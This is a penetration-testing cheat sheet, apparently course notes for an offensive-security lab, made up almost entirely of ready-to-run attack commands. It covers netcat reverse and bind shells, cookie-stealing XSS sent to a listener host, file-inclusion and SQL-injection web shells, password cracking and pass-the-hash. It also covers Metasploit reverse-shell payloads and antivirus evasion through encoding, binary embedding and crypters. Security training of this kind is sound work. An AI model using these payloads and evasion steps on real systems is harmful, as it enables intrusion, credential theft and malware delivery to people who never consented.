---
description: Commands for all things
---

# Commands Cheat Sheet

## Find, Locate, and Which

```text
$ updatedb

$ locate sbd.exe

$ which sbd

$ find / -name sbd*
```

## Initial Setup

```text
$ passwd                    # change passwd

$ systemctl start ssh       # start service, apache2 is default webserver

$ netstat -antp|grep sshd   # check if service is running

$ systemctl enable ssh      # enables autostart at boot
```

## Bash Scripting

```text
$ wget www.cisco.com
$ grep "href=" index.html|cut -d "/" -f 3|grep "\."|cut -d '"' -f 1|sort -u
$ cat index.html | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u > list.txt
$ for url in $(cat list.txt); do host $url; done
$ for url in $(cat list.txt); do host $url; done|grep "has address"|cut -d " " -f 4|sort -u
```

## Finding brute force attack in apache logs

```text
$ gunzip access_log.txt.gz

$ head access.log

$ wc -l access.log
1788 access.log

$ cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn

$ cat access.log | grep '208.68.234.99' | cut -d "\"" -f 2 | uniq -c
1038 GET //admin HTTP/1.1

$ cat access.log | grep '208.68.234.99' | grep '/admin ' | sort -u

$ cat access.log|grep '208.68.234.99'| grep -v '/admin '
```

## Netcat

#### Basic Connection to port

```text
$ nc -nv 10.0.0.22 110
```

#### Listening on a port

```text
C:\Users\user>nc -nlvp 4444

$ nc -nlvp 4444
```

#### File Transfers

```text
C:\Users\user\Desktop>nc -nlvp 4444 > incoming.exe

$ nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe
```

#### Bind Shell

```text
C:\Users\user>nc -nlvp 4444 -e cmd.exe

$ ifconfig eth0 | grep inet
$ nc -nv 10.0.0.22 4444
```

#### Reverse Shell

```text
C:\Users\user>nc -nlvp 4444

$ nc -nv 10.0.0.22 4444 -e /bin/bash
```

#### SSL Encrypted Bind Shell

```text
C:\Users\user>ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
$ ncat -v 10.0.0.22 4444 --ssl
```

## Packet Capture

```text
$ tcpdump -r password_cracking_filtered.pcap

$ tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3}'|sort -u | head

$ tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap

$ tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap

$ tcpdump -n port 81 -r password_cracking_filtered.pcap

$ tcpdump -nX -r password_cracking_filtered.pcap

$ tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```

## Recon

```text
$ theharvester -d cisco.com -b google >google.txt

$ theharvester -d cisco.com -l 10 -b bing >bing.txt

$ whois megacorpone.com

$ whois 50.7.67.186

$ recon-ng
[recon-ng][default] > use recon/domains-contacts/whois_pocs
[recon-ng][default] > use recon/domains-vulnerabilities/xssed
[recon-ng][default] > use recon/domains-hosts/google_site_web
```

## DNS Enumeration

```text
$ host -t ns megacorpone.com

$ host -t mx megacorpone.com

$ host www.megacorpone.com
```

### Using a List of Common Host Names

```text
$ for ip in $(cat list.txt);do host $ip.megacorpone.com;done
```

### Reverse Lookup Brute Force

```text
$ for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"
```

### DNS Zone Transfers

```text
$ host -l <domain name> <dns server address>
$ host -l megacorpone.com ns1.megacorpone.com

$ host -t ns megacorpone.com | cut -d " " -f 4

$ dnsrecon -d megacorpone.com -t axfr

$ dnsenum zonetransfer.me
```

## Port Scanning

`$ nc -nvv -w 1 -z 10.0.0.19 3388-3390`

### udp scan

`$ nc -nv -u -z -w 1 10.0.0.19 160-162`

### Examining traffic generated by a scan

```text
$ iptables -I INPUT 1 -s 10.0.0.19 -j ACCEPT
$ iptables -I OUTPUT 1 -d 10.0.0.19 -j ACCEPT
$ iptables -Z
$ nmap -sT 10.0.0.19
$ iptables -vn -L
$ iptables -Z
```

### ping sweep

```text
$ nmap -sn 10.11.1.1-25

$ nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
$ grep Up ping-sweep.txt | cut -d " " -f 2

$ nmap -p 80 10.11.1.1-254 -oG web-sweep.txt
$ grep open web-sweep.txt |cut -d" " -f2

$ nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt
```

### OS fingerprinting

`$ nmap -O 10.0.0.19`

### Banner Grabbing and Service Enumeration

```text
$ nmap -sV -sT 10.0.0.19

$ nmap 10.0.0.19 --script smb-os-discovery.nse

$ nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
```

### SMB Enum

```text
$ nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254

$ nbtscan -r 10.11.1.0/24

$ enum4linux -a 10.11.1.227

$ ls -l /usr/share/nmap/scripts/smb*
$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
$ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.201
```

### SMTP Enum

`$ nc -nv 10.11.1.215 25`

### SNMP Enum

```text
$ nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt

$ echo public > community
$ echo private >> community
$ echo manager >> community
$ for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
$ onesixtyone -c community -i ips
```

#### enum entire mib tree

`$ snmpwalk -c public -v1 10.11.1.219`

#### enum windows users

`$ snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25`

#### enum running windows processes

`$ snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2`

#### enum open tcp ports

`$ snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3`

#### enum installed software

`$ snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2`

### Vulnerability Scanning with nmap

```text
$ alias nse="ls /usr/share/nmap/scripts"
$ echo 'alias nse="ls /usr/share/nmap/scripts"' >> ~/.bashrc
$ nse | grep *vuln*

$ nmap -v -p 80 --script=http-vuln-cve2010-2861 10.11.1.210

$ nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254

$ nmap -v -p 139, 445 --script=smb-security-mode 10.11.1.236

$ nmap -v -p 80 --script=http-vuln-cve2011-3192 10.11.1.205-210
```

### OpenVas setup

```text
$ openvas-setup
$ firefox https://127.0.0.1:9392
```

## Exploitation

```text
$ apt-get install mingw-w64
$ i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe
$ wine 646.exe 10.11.1.35
$ nc -nlvp 4444
```

## Uploading files to a windows machine

### TFTP

```text
$ mkdir /tftp
$ atftpd --daemon --port 69 /tftp
$ cp /usr/share/windows-binaries/nc.exe /tftp/

C:\Users\Offsec>tftp -i 10.11.0.5 get nc.exe
```

### FTP

```text
$ apt-get update && apt-get install pure-ftpd

C:\Users\offsec>echo open 10.11.0.5 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo ftp>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt

C:\Users\offsec>ftp -v -n -s:ftp.txt
```

### Non Interactive VBS script HTTP downloader

`C:\Users\user>cscript wget.vbs http://10.11.0.5/evil.exe evil.exe`

### Powershell remote file download

```text
C:\Users\Offsec> echo $storageDir = $pwd > wget.ps1
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File
wget.ps1
```

### Using debug.exe to transfer files

```text
$ locate nc.exe|grep binaries
$ cp /usr/share/windows-binaries/nc.exe .
$ upx -9 nc.exe
$ locate exe2bat
$ cp /usr/share/windows-binaries/exe2bat.exe .
$ wine exe2bat.exe nc.exe nc.txt

* the nc.txt file can now simply be copied and pasted into the remote non-interactive shell
```

## Privilege escalation - Linux

```text
//more info at http://blog.zx2c4.com/749

$ id
$ cat /etc/shadow|grep root
$ wget -O exploit.c http://www.exploit-db.com/download/18411
$ gcc -o mempodipper exploit.c
$ ./mempodipper
```

## Privilege escalation - Windows

Python scripts can be turned into Standalone executables with pyinstaller

```text
> python pyinstaller.py --onefile ms11-080.py
```

### File Permissions

Everyone Windows group has full read and write access to the file. This would allow a lower privileged user to replace the affected file used with a malicious one.

```text
c:\Program Files\Photodex\ProShow Producer>icacls <exe_file>
c:\Program Files\Photodex\ProShow Producer>icacls scsiaccess.exe

$ cat useradd.c
$ i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
```

## Client Side Exploits

```text
$ cd /var/www/html/
$ wget -O exploit.html http://www.exploit-db.com/download/24017
$ systemctl start apache2
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f
js_le -e generic/none
```

The resulting shellcode is 18 bytes smaller that the one used in the exploit. To keep the size similar, we can pad our shellcode with nops.

### Java Signed Applet Attacks

```text
//script code on pg 224
$ javac -source 1.7 -target 1.7 Java.java

$ echo “Permissions: all-permissions” > /root/manifest.txt

$ jar cvf Java.jar Java.class

$ keytool -genkey -alias signapplet -keystore mykeystore -keypass
mykeypass -storepass password123

[Unknown]:
Offensive Security
What is the name of your organizational unit?
[Unknown]: Ownage Dept
What is the name of your organization?
[Unknown]: Offensive Security
What is the name of your City or Locality?
What is the name of your State or Province?
What is the two-letter country code for this unit?
Is CN=Offensive Security, OU=Ownage Dept, O=Offensive Security, L=localhost,
ST=127.0.0.1, C=US correct?
$ jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass
-signedjar SignedJava.jar Java.jar signapplet

$ cp Java.class SignedJava.jar /var/www/html/

$ echo '<applet width="1" height="1" id="Java Secure" code="Java.class"
archive="SignedJava.jar"><param name="1"
value="http://10.11.0.5:80/evil.exe"></applet>' > /var/www/html/java.html

$ locate nc.exe

$ cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe
```

## Web App Attacks

### XSS

```text
<iframe SRC="http://10.11.0.144/report" height = "0" width ="0"></iframe>

$ nc -nlvp 80
```

### Stealing Cookies

```text
<script>
new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;
</script>

$ nc -nlvp 80
```

### Local File Inclusion

```text
$ nc -nv 10.11.1.35 80
(UNKNOWN) [10.11.1.35] 80 (http) open
<?php echo shell_exec($_GET['cmd']);?>

-- writes php code into c:\xampp\apache\logs\access.log

http://10.11.1.35/addguestbook.php?name=a&comment=b&cmd=ipconfig&LANG=../../../../../
../../xampp/apache/logs/access.log%00
```

### Remote File Inclusion

```text
http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.5/evil.txt

$ nc -nlvp 80

$ cat /var/www/html/evil.txt
<?php echo shell_exec("ipconfig");?>

$ systemctl start apache2
```

### SQL Injection

in username field enter:

```text
wronguser' OR 1=1 LIMIT 1;#
admin' or 1=1 limit 1 --
```

```text
.../comment.php?id=738 order by 1

.../comment.php?id=738 union all select 1,2,3,4,5,6

.../comment.php?id=738 union all select 1,2,3,4,@@version,6

.../comment.php?id=738 union all select 1,2,3,4,user(),6

.../comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM
information_schema.tables

.../comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM
information_schema.columns where table_name='users'

.../comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,
password),6 FROM users

.../comment.php?id=738 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

### SQLmap

```text
$ sqlmap -u http://10.11.1.35 --crawl=1

$ sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --dump --threads=5

$ sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --os-shell
```

## Password Cracking

```text
$ crunch 6 6 0123456789ABCDEF -o crunch1.txt

$ wc -l crunch1.txt

$ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha

$ cat dumped.pass.txt

$ crunch 8 8 -t ,@@^^%%%

C:\>fgdump.exe

C:\>type 127.0.0.1.pwdump

$ cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt

$ wc -l megacorp-cewl.txt

$ grep nanobot megacorp-cewl.txt

$ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt

$ grep nanobots mutated.txt

$ john --wordlist=megacorp-cewl.txt --rules --stdout >hugepass.txt
```

### Online Password Attacks

```text
$ medusa -h 10.11.1.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 10

$ ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35

$ hydra -P password-file.txt -v 10.11.1.219 snmp

$ hydra -l root -P password-file.txt 10.11.1.219 ssh
```

### Pass the hash

```text
$ hash-identifier

$ john 127.0.0.1.pwdump

$ john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump

$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump

$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

$ export
SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
$ pth-winexe -U administrator% //10.11.01.76 cmd
```

## Port Forwarding and Redirection

```text
$ apt-get install rinetd
$ cat /etc/rinetd.conf
# bindadress bindport connectaddress connectport
<proxy-ip> <proxy-in-port> <target-ip> <target-port>
w.x.y.z 53 a.b.c.d 80

$ ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
$ ssh <gateway> -R <remote port to bind>:<local host>:<local port>
$ ssh -D <local proxy port> -p <remote port> <target>

$ ssh -f -N -R 2222:127.0.0.1:22 root@208.68.234.100
$ netstat -lntp
$ ssh -f -N -D 127.0.0.1:8080 -p 2222 hax0r@127.0.0.1
$ netstat -lntp
$ proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24
```

### HTTP tunneling

`$ nc -vvn 192.168.1.130 8888`

## Metasploit Framework

```text
$ systemctl start postgresql
$ systemctl enable postgresql //to autostart at boot
$ msfconsole

msf > show -h
msf> use auxiliary/scanner/snmp/snmp_enum
msf> use auxiliary/scanner/smb/smb_version
msf> use auxiliary/scanner/http/webdav_scanner
msf > services -p 443
```

### FTP Brute Force

```text
$ msfconsole -q

msf> search type:auxiliary login
msf> use auxiliary/scanner/ftp/ftp_login
msf auxiliary(ftp_login) > show options
msf auxiliary(ftp_login) > set PASS_FILE /root/password-file.txt
msf auxiliary(ftp_login) > set USERPASS_FILE /root/users.txt
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > services -p 443 --rhosts

msf > search pop3
msf > use exploit/windows/pop3/seattlelab_pass
msf exploit(seattlelab_pass) > show payloads
msf exploit(seattlelab_pass) > set PAYLOAD windows/shell_reverse_tcp
msf > use exploit/windows/pop3/seattlelab_pass
msf exploit(seattlelab_pass) > set RHOST 10.11.1.35
msf exploit(seattlelab_pass) > exploit

meterpreter > sysinfo
meterpreter > getuid
meterpreter > search -f *pass*.txt
meterpreter > mkdir c:\\temp
meterpreter > upload /usr/share/windows-binaries/nc.exe c:\\temp
meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
meterpreter > shell

$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe
-o shell_reverse.exe
$ file shell_reverse.exe

$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe
-e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe

$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe
-e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o
shell_reverse_msf_encoded_embedded.exe

$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443
-f exe -o met_https_reverse.exe

msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/shell_reverse_tcp
msf exploit(handler) > set LHOST 10.11.0.5
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > set AutoRunScript migrate -f
msf exploit(handler) > run -jz
```

### Building Custom MSF Modules

```text
$ mkdir -p ~/.msf4/modules/exploits/linux/misc

$ cd ~/.msf4/modules/exploits/linux/misc

$ cp /usr/share/metasploitframework/modules/exploits/linux/misc/gld_postfix.rb ./crossfire.rb
$ vim crossfire.rb
--- --> (script is on pg331)
```

### Meterpreter post exploitation fetures

```text
meterpreter > help
meterpreter > ?

msf exploit(handler) > search post

meterpreter > background        # or [ctrl-z]

msf exploit(handler) > use exploit/windows/local/service_permissions
```

## Bypassing AntiVirus Software

#### Unencoded

`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -o shell_reverse.exe`

#### skitata-ga-ni

`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe`

#### Embedded

`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe`

### Crypting with software protectors - Hyperion

```text
$ cp shell_reverse_msf_encoded_embedded.exe backdoor.exe

$ cp /usr/share/windows-binaries/Hyperion-1.0.zip .

$ unzip Hyperion-1.0.zip

$ cd Hyperion-1.0/

$ i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
$ cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libgcc_s_sjlj-1.dll .
$ cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++-6.dll .
$ wine hyperion.exe ../backdoor.exe ../crypted.exe
```

{% hint style="info" %}
The most foolproof method of bypassing antivirus software protections is to use tools and binaries that are unknown to AV vendors, either by writing your own, or by finding and using unique payloads.
{% endhint %}

\*C reverse shell code from google search - pg343
